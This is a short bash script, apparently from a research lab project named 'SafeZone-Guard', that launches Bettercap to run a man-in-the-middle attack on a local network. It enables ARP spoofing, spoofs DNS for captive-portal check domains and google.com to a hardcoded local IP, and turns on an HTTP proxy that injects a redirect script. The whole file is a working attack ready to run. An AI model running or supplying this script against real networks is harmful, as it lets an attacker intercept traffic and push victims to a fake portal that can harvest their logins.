#!/bin/bash

# SafeZone-Guard Automation Script
# This script starts the Redirection Attack using Bettercap with a static IP

echo "🚀 Starting SafeZone-Guard Lab..."
echo "📍 Hardcoded Mac IP: 192.168.0.2"

# Run Bettercap and pass all the commands to the internal console
sudo bettercap -iface en0 -eval "
  set http.proxy.script research/portal/redirect.js;
  set dns.spoof.address 192.168.0.2;
  set dns.spoof.domains connectivitycheck.gstatic.com, captive.apple.com, google.com;
  http.proxy on;
  dns.spoof on;
  arp.spoof on;
  net.probe on;
  clear
"